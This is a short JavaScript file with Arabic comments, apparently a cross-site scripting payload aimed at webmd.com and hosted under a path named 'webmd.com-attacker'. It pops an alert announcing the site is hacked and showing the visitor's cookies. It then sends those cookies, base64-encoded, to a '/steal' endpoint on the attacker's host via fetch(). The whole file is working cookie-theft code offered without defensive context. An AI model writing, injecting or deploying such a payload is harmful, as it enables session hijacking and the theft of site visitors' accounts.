// ملف: https://egyhaker.github.io/webmd.com-attacker/evil-script.js
alert("تم اختراق الموقع! ملفات تعريف الارتباط الخاصة بك هي: " + document.cookie);
// هنا يمكن للمهاجم إرسال الكوكيز لخادمه الخاص
fetch('https://egyhaker.github.io/webmd.com-attacker/steal?data=' + btoa(document.cookie));
